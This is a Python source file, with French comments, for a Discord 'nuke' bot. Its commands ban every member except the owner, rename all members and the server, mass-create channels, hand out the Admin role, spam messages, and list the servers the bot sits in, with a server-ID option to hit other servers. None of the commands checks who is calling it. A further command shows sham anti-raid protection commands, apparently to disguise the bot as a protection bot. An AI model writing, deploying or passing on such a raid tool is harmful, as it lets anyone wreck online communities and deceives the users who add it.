import discord
from discord.ext import commands

# Activer tous les intents nécessaires, y compris les intents privilégiés
intents = discord.Intents.default()
intents.members = True
intents.messages = True
intents.guilds = True  # Nécessaire pour obtenir la liste des guildes
intents.message_content = True  # Activer l'intent de contenu de message

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot connecté en tant que {bot.user}')

@bot.event
async def on_command_error(ctx, error):
    """Gérer les erreurs de commande."""
    await ctx.send(f"Erreur : {str(error)}")

@bot.command()
async def ban_all(ctx, guild_id: int = None):
    """Bannit tous les membres du serveur spécifié, sauf le propriétaire."""
    if guild_id is None:
        guild = ctx.guild  # Utilise le serveur actuel si aucun ID n'est fourni
    else:
        guild = bot.get_guild(guild_id)

    if guild is None:
        return await ctx.send("Serveur non trouvé.")
    
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.ban(reason="Banni par le bot.")
            except discord.Forbidden:
                await ctx.send(f'Impossible de bannir {member.name}.')
    await ctx.send("Tous les membres ont été bannis.")

@bot.command()
async def rename_all(ctx, new_nickname: str, guild_id: int = None):
    """Renomme tous les membres du serveur spécifié avec le pseudo choisi."""
    if guild_id is None:
        guild = ctx.guild  # Utilise le serveur actuel si aucun ID n'est fourni
    else:
        guild = bot.get_guild(guild_id)

    if guild is None:
        return await ctx.send("Serveur non trouvé.")
    
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.edit(nick=new_nickname)
            except discord.Forbidden:
                await ctx.send(f'Impossible de renommer {member.name}.')
    await ctx.send("Tous les membres ont été renommés.")

@bot.command()
async def change_guild_name(ctx, new_name: str, guild_id: int = None):
    """Change le nom du serveur spécifié."""
    if guild_id is None:
        guild = ctx.guild  # Utilise le serveur actuel si aucun ID n'est fourni
    else:
        guild = bot.get_guild(guild_id)

    if guild is None:
        return await ctx.send("Serveur non trouvé.")
    
    await guild.edit(name=new_name)
    await ctx.send(f'Le nom du serveur a été changé en {new_name}.')

@bot.command()
async def create_channels(ctx, num_channels: int, guild_id: int = None):
    """Crée le nombre de salons spécifié dans le serveur donné."""
    if guild_id is None:
        guild = ctx.guild  # Utilise le serveur actuel si aucun ID n'est fourni
    else:
        guild = bot.get_guild(guild_id)

    if guild is None:
        return await ctx.send("Serveur non trouvé.")
    
    for i in range(num_channels):
        await guild.create_text_channel(f'channel-{i+1}')
    await ctx.send(f'{num_channels} salons ont été créés.')

@bot.command()
async def give_admin(ctx, member: discord.Member, guild_id: int = None):
    """Donne le rôle d'administrateur à un membre choisi dans le serveur spécifié."""
    if guild_id is None:
        guild = ctx.guild  # Utilise le serveur actuel si aucun ID n'est fourni
    else:
        guild = bot.get_guild(guild_id)

    if guild is None:
        return await ctx.send("Serveur non trouvé.")
    
    await member.add_roles(discord.utils.get(guild.roles, name="Admin"))
    await ctx.send(f'{member.name} a reçu le rôle d\'administrateur.')

@bot.command()
async def send_messages(ctx, count: int, message: str, guild_id: int = None):
    """Envoie un nombre spécifié de messages dans le serveur donné."""
    if guild_id is None:
        guild = ctx.guild  # Utilise le serveur actuel si aucun ID n'est fourni
    else:
        guild = bot.get_guild(guild_id)

    if guild is None:
        return await ctx.send("Serveur non trouvé.")
    
    channel = ctx.channel  # Utiliser le canal où la commande a été appelée
    for _ in range(count):
        await channel.send(message)
    await ctx.send(f'{count} messages ont été envoyés.')

@bot.command()
async def servers(ctx):
    """Affiche tous les serveurs où le bot est présent."""
    guilds = bot.guilds
    embed = discord.Embed(title="Serveurs du Bot", color=discord.Color.blue())
    for guild in guilds:
        embed.add_field(name=guild.name, value=f"ID: {guild.id}", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def cmds(ctx):
    """Affiche toutes les commandes du bot avec leurs descriptions."""
    embed = discord.Embed(title="Commandes du Bot", color=discord.Color.red())
    embed.add_field(name="👮 !ban_all [ID Serveur]", value="Bannit tous les membres du serveur spécifié, sauf le propriétaire.", inline=False)
    embed.add_field(name="✏️ !rename_all <nouveau_surnom> [ID Serveur]", value="Renomme tous les membres du serveur spécifié.", inline=False)
    embed.add_field(name="🏷️ !change_guild_name <nouveau_nom> [ID Serveur]", value="Change le nom du serveur spécifié.", inline=False)
    embed.add_field(name="📢 !create_channels <nombre> [ID Serveur]", value="Crée le nombre de salons spécifié dans le serveur donné.", inline=False)
    embed.add_field(name="🔑 !give_admin <membre> [ID Serveur]", value="Donne le rôle d'administrateur à un membre choisi dans le serveur spécifié.", inline=False)
    embed.add_field(name="📬 !send_messages <nombre> <message> [ID Serveur]", value="Envoie un nombre spécifié de messages dans le serveur donné.", inline=False)
    embed.add_field(name="🗺️ !servers", value="Affiche tous les serveurs où le bot est présent.", inline=False)
    embed.add_field(name="💖 Kodexyz x Light", value="Merci d'utiliser notre bot !", inline=False)

    await ctx.send(embed=embed)

@bot.command()
async def fake_protection_cmds(ctx):
    """Affiche des fausses commandes de protection."""
    embed = discord.Embed(title="Commandes de Protection (Faux)", color=discord.Color.orange())
    embed.add_field(name="🔒 !antiraid", value="Détecte les raids et les expulse... mais seulement en rêve.", inline=False)
    embed.add_field(name="🚫 !antimassban", value="Empêche les bans de masse... mais seulement dans l'imaginaire.", inline=False)
    embed.add_field(name="👟 !antimasskick", value="Bloque les kicks en masse... sauf ceux de l'équipe de sécurité.", inline=False)
    embed.add_field(name="🌐 !antiwebhook", value="Détruit les webhooks non autorisés... mais pas les vrais.", inline=False)
    embed.add_field(name="⚠️ !antispam", value="Stoppe le spam... en lui envoyant des messages doux.", inline=False)
    embed.add_field(name="🐌 !antidox", value="Protège des menaces en ligne... mais il ne sait pas quoi faire.", inline=False)
    embed.add_field(name="🛡️ !antimassrole", value="Empêche la création de rôles en masse... à condition que ce soit dans les rêves.", inline=False)
    
    await ctx.send(embed=embed)

# Remplace 'YOUR_TOKEN_HERE' par le token de ton bot
bot.run('YOUR_TOKEN_HERE')
